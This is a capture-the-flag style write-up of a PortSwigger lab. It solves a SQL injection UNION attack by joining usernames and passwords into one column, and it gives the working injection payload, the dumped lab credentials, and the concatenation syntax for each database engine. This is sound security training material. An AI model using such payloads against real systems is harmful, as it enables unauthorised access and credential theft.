# SQL Injection UNION Attack — Retrieving Multiple Values in a Single Column

**Lab:** SQL injection UNION attack, retrieving multiple values in a single column
**Source:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Difficulty:** Practitioner

## Description

The product category filter is vulnerable to SQL injection, with results reflected in the response. The database contains a `users` table with `username` and `password` columns. This time only one column in the outer query is string-compatible, so both values need to be retrieved through that single column. Goal is to dump all usernames and passwords, then log in as `administrator`.

## Solution

### Step 1: Recall column layout

From prior labs, the query returns multiple columns, but only one of them accepts string data — meaning `username` and `password` can't be split across two separate columns like in earlier labs. Both need to be squeezed into the one working string column.

### Step 2: Concatenate username and password into one string

Used string concatenation to combine both values into a single column, with `~` as a separator so the two values are easy to tell apart visually:

```sql
' UNION SELECT NULL, username || '~' || password FROM users--
```

(`||` is the concatenation operator on this database. On MySQL, `CONCAT(username,'~',password)` would be used instead.)

Full injection in the category parameter:

```
Gifts' UNION SELECT NULL, username || '~' || password FROM users--
```

### Result

The response listed every user's credentials as a single combined string per row:

```
wiener~a10avtq2alpidukmatnv
administrator~90w7tsu8axj7agncc6e4
carlos~f7v3dj2pvjszanx09gi0
```

![UNION result showing username~password concatenated pairs](content/assets/portswigger_sqli_union_single_column/01-union-result.png)

### Step 3: Log in as administrator

Split the `administrator` row on the `~` separator to get the credentials:

- **Username:** `administrator`
- **Password:** `90w7tsu8axj7agncc6e4`

![Login form filled with administrator credentials](content/assets/portswigger_sqli_union_single_column/02-login-form.png)

### Result

Logged in successfully as `administrator`. Lab solved.

## Flag / Result

```
Logged in as administrator — lab solved
```

## Takeaway

When only one column in a UNION is string-compatible, multiple values can still be extracted by concatenating them into a single string with a clear separator (e.g. `~`). The database's concatenation syntax varies: `||` on Oracle/PostgreSQL/SQLite, `CONCAT()` on MySQL, `+` on MSSQL.
